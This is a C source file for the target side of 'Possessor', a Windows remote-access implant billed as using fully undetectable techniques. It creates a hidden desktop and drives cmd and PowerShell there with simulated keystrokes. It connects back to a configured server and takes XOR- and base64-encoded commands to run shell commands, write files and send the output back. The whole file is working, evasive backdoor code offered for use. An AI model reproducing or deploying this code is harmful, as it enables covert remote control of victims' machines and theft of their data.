/*
		Possessor - Target Side
		by gnx
		twitter.com/alissonbertochi
		
		https://github.com/gnxbr/Fully-Undetectable-Techniques/tree/main/possessor
*/
	
#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <winsock2.h>

#include "possessor.h"
#include "base64.h"

void endFile(int netfd){
	send(netfd, "EBoTdA==", 8, 0);
}

void endConn(int netfd){
	send(netfd, "Pjw5OTAxdA==", 12, 0);
}

void okMsg(int netfd){
	send(netfd, "EC0wNiAhMDF0", 12, 0);
}

void quickStartFocus(HWND windowExplorer){
	PostMessage(windowExplorer, WM_KEYDOWN, VK_F4, 1);
	Sleep(1000);
}

HWND searchWindow(char *window){
	for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT)){   
	
		if (!IsWindowVisible(hwnd))
			continue;

		int length = GetWindowTextLength(hwnd);
		
		if (length == 0)
			continue;

		char title[length+1];
		GetWindowText(hwnd, title, length+1);
		if(strstr(title, window) != 0){
			HWND newhwnd = malloc(sizeof(hwnd));
			newhwnd = hwnd;
			return newhwnd;
		}
	}
}

unsigned char *x0r(char *data, int len){

	unsigned char *temp = (unsigned char *)malloc(len);
	
	int i;
	for(i = 0; i < len; i++){
		temp[i] = (data[i] ^ BYTE);
	}
	
	temp[len-1] = '\0';
	
	return temp;
}

b64result *b64decode(char *data){
	
	b64result *decrypted_base64 = (b64result *)malloc(sizeof(b64result));
	memset(decrypted_base64, 0, sizeof(b64result));
	decrypted_base64->data = base64_decode(data, strlen(data), &decrypted_base64->len);
	
	return decrypted_base64;
}
	
b64result *b64encode(char *data, int len){
	
	b64result *encrypted_base64 = (b64result *)malloc(sizeof(b64result));
	memset(encrypted_base64, 0, sizeof(b64result));
		
	encrypted_base64->data = base64_encode(data, len-1, &encrypted_base64->len);

	return encrypted_base64;
}

char *concatenate(char *nome, char *extra){

	char *nomecompleto = (char *) malloc( strlen(nome) + strlen(extra) + 1 );
	
	strcpy(nomecompleto, nome);
	strcat(nomecompleto, extra);
	
	return nomecompleto;
	
}

void writeFile(HWND handle, char *name, char *content, int netfd){
	int i;
	
	char *enterTemp = "cd %TEMP%#";
	char *startCmd = "echo ";
	char *endCmd = concatenate(" >> ", name);
	char *endCmdF = concatenate(endCmd, "#");
	sendChars(handle, enterTemp);
	
	Sleep(100);
	
	sendChars(handle, startCmd);
	
	for(i = 0; i < strlen(content); i++){
		
		Sleep(30);
		
		switch(content[i]){
		
			case 35:
				sendChars(handle, endCmdF);
				Sleep(100);
				sendChars(handle, startCmd);
				break;
		
			case 64:
				PostMessage(handle, WM_CHAR, VK_SPACE, 1);
				break;
		
			case 38:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, content[i], 1);
				break;

			case 60:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, content[i], 1);
				break;

			case 62:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, content[i], 1);
				break;
		
			default:
				PostMessage(handle, WM_CHAR, content[i], 1);
				
			}
	}
	
	sendChars(handle, endCmdF);
	okMsg(netfd);
	endFile(netfd);
	free(endCmd);
	endCmd = NULL;
	free(endCmdF);
	endCmdF = NULL;

}

void sendEscape(HWND handle){
	PostMessage(handle, WM_CHAR, '^', 1);
}

void deleteChars(HWND handle){
	int i;
	for(i = 0; i < 30; i++){
		PostMessage(handle, WM_CHAR, VK_BACK, 1);
		//Sleep(REALDELAY);
	}
}

void sendChars(HWND handle, char *comando){
	int len = strlen(comando);
	int i;
	
	for(i = 0; i < len; i++){
		if(comando[i] == '#'){
			PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
			continue;
		}
		PostMessage(handle, WM_CHAR, comando[i], 1);
	}
}

void sendCmdtoPowershell(HWND handle, char *cmd){

	char *endCmd = " | Out-File -FilePath $env:TEMP/result.txt -encoding utf8";

	int i;
	
	if(strstr(cmd, "exit") != NULL){
		for(i = 0; i < strlen(cmd); i++){
			PostMessage(handle, WM_CHAR, cmd[i], 1);
		}
		PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
		return;
	}
	
	for(i = 0; i < strlen(cmd); i++){
		
		Sleep(30);
		
		switch(cmd[i]){

			case 64:
				PostMessage(handle, WM_CHAR, VK_SPACE, 1);
				break;

			case 38:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;

			case 60:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;

			case 62:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;

			default:
				PostMessage(handle, WM_CHAR, cmd[i], 1);
		}
	}
	
	for(i = 0; i < strlen(endCmd); i++){
		PostMessage(handle, WM_CHAR, endCmd[i], 1);
	}
	
	PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
	
}

void sendCmdtoCmd(HWND handle, char *cmd){
	
	char *endCmd = " > %TEMP%\\result.txt";
	int i;
	
	for(i = 0; i < strlen(cmd); i++){
		
		Sleep(30);
		
		switch(cmd[i]){
		
			case 64:
				PostMessage(handle, WM_CHAR, VK_SPACE, 1);
				break;

			case 38:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;

			case 60:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;

			case 62:
				sendEscape(handle);
				PostMessage(handle, WM_CHAR, cmd[i], 1);
				break;
		
			default:
				PostMessage(handle, WM_CHAR, cmd[i], 1);
		
		}
	}
	
	for(i = 0; i < strlen(endCmd); i++){
		PostMessage(handle, WM_CHAR, endCmd[i], 1);
	}
	
	PostMessage(handle, WM_KEYDOWN, VK_RETURN, 1);
}

void sendResult(int netfd){
	
	FILE *result;
	char *name;
	name = concatenate(getenv("TEMP"), "\\result.txt");
	
	result = fopen(name, "r");
	
	unsigned char chr;
	unsigned char tmpbuf[BUFSEND];
	unsigned char *tmpbuf_x0r;
	b64result *tmpbuf_final;
	memset(tmpbuf, 0, BUFSEND);
	int i = 0;
	
 	do {
		chr = fgetc(result);
		Sleep(0.5);
		
		if( ((i == 0) && (chr == '\n')) || (chr == 187) || (chr == 191) || (chr ==  239) ){
			continue;
		}
		
		if((i == 0) && (chr == 255)){
			break;
		}
		
		tmpbuf[i] = chr;
		i++;
		
		if(chr == '\n') {
			tmpbuf[i] = '\0';
			tmpbuf_x0r = x0r(tmpbuf, i);
			tmpbuf_final = b64encode(tmpbuf_x0r, i);
			send(netfd, tmpbuf_final->data, tmpbuf_final->len, 0);
			memset(tmpbuf, 0, BUFSEND);
			free(tmpbuf_final->data);
			tmpbuf_final->data = NULL;
			free(tmpbuf_final);
			tmpbuf_final = NULL;
			free(tmpbuf_x0r);
			tmpbuf_x0r = NULL;
			i = 0;
		}
    } while(chr != 255);
	
	okMsg(netfd);
	endFile(netfd);
	fclose(result);
	free(name);
	name = NULL;
}

HWND getHandle(HWND window){
	
	DWORD threadProcessId =	GetWindowThreadProcessId(window, 0);
	
	GUITHREADINFO infosThread;
	infosThread.cbSize = sizeof(GUITHREADINFO);
	
	GetGUIThreadInfo(threadProcessId, &infosThread);
	
	HWND focusHandle = malloc(sizeof(infosThread.hwndFocus));
	
	focusHandle = infosThread.hwndFocus;
	
	return focusHandle;
}
	
int main(void){
	
	char *desktopName = "stealth";
	HDESK windowStealthy;
	HDESK currentWindow;
	
	windowStealthy = CreateDesktopA(desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
	currentWindow = GetThreadDesktop(GetCurrentThreadId());

	if(windowStealthy == NULL){
		exit(EXIT_FAILURE);
	}
	
	SetThreadDesktop(windowStealthy);
	
	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInformation; 
	
	memset(&startupInfo, 0, sizeof(startupInfo));
	memset(&processInformation, 0, sizeof(processInformation));
	
	startupInfo.lpDesktop = desktopName;
	BOOL create = CreateProcessA(NULL, "explorer.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation);
	
	if(!create){
		exit(EXIT_FAILURE);
	}
	
	Sleep(2000);
	
	HWND windowExplorer = searchWindow("Explorador");
	
	quickStartFocus(windowExplorer);
	
	HWND handleExplorerFocus = getHandle(windowExplorer);
	
	deleteChars(handleExplorerFocus);
	
	char *cmd = "cmd.exe#";
	sendChars(handleExplorerFocus, cmd);
	
	Sleep(1000);
	
	HWND windowCmd = searchWindow("cmd.exe");
	
	sendChars(windowCmd, "set COPYCMD=/y#");
	
	quickStartFocus(windowExplorer);
	
	deleteChars(handleExplorerFocus);
	
	char *powershell = "powershell.exe#";
	sendChars(handleExplorerFocus, powershell);
	
	Sleep(3000);
	
	HWND windowPowershell = searchWindow("PowerShell");
	
	WSADATA wsa;
	WSAStartup((2, 2), &wsa);
	
	int netfd;
	
	if((netfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		exit(EXIT_FAILURE);
	}
	
	struct sockaddr_in server = {
		.sin_family = AF_INET,
		.sin_port = htons(PORT),
		.sin_addr.s_addr = inet_addr(SERVERIP)
	};
	
	int structsize = sizeof(struct sockaddr_in);
	
	if(RECONNECT){
		int i = 0;
		int conn;
		while(conn = connect(netfd, (struct sockaddr *)&server, structsize) == -1){
			if(i == 10)
				break;
			Sleep(RECTIME);
			i++;
		}
		if(conn == -1){
			closesocket(netfd);
			exit(1);
		}
	}
	else{
		if(connect(netfd, (struct sockaddr *)&server, structsize) == -1){
			exit(EXIT_FAILURE);
		}
	}
	
	unsigned char *newbuffer;
	b64result *b64decrypted;
	char buffer[BUFLEN];
	int bytesRecebidos;
	char *content;
	char *name;
	char *command;
	char *result;
	int exit = 0;
	
	while(1){

		bytesRecebidos = recv(netfd, buffer, BUFLEN, 0);

		if(bytesRecebidos == -1){
			exit = 1;
		}
		
		b64decrypted = b64decode(buffer);
		
		newbuffer = x0r(b64decrypted->data, b64decrypted->len);
		
		if(strstr(newbuffer, "kill!") != NULL){
			exit = 1;
		}
		
		if(strstr(newbuffer, "readout!") != NULL){
			sendResult(netfd);
		}
		
		if(strcmp(newbuffer, "\0") == 0){
			send(netfd, "\n", 1, 0);
		}
		
		if(strstr(newbuffer, "cmd: ") != NULL){
			strtok(newbuffer, " ");
			command = strtok(NULL, " ");
			sendCmdtoCmd(windowCmd, command);
			Sleep(1000);
			sendResult(netfd);
		}
		
		if(strstr(newbuffer, "powershell: ") != NULL){
			strtok(newbuffer, " ");
			command = strtok(NULL, " ");
			sendCmdtoPowershell(windowPowershell, command);
			Sleep(1000);
			sendResult(netfd);
		}
		
		if(strstr(newbuffer, "writefile: ") != NULL){
			strtok(newbuffer, " ");
			name = strtok(NULL, " ");
			content = strtok(NULL, " ");
			writeFile(windowCmd, name, content, netfd);
		}
		
		memset(buffer, 0, sizeof(buffer));
		free(b64decrypted->data);
		b64decrypted->data = NULL;
		free(b64decrypted);
		b64decrypted = NULL;
		free(newbuffer);
		newbuffer = NULL;
		
		if(exit){
			sendCmdtoCmd(windowCmd, "exit");
			sendCmdtoPowershell(windowPowershell, "exit");
			PostMessage(windowExplorer, WM_CLOSE, 0, 0);
			endConn(netfd);
			closesocket(netfd);
			break;
		}
	}
	
	CloseDesktop(windowStealthy);
	CloseHandle(windowCmd);
	CloseHandle(windowExplorer);
	CloseHandle(handleExplorerFocus);
	
	free(handleExplorerFocus);
	handleExplorerFocus = NULL;
	free(windowCmd);
	windowCmd = NULL;
	free(windowExplorer);
	windowExplorer = NULL;
	
	return 0;
}
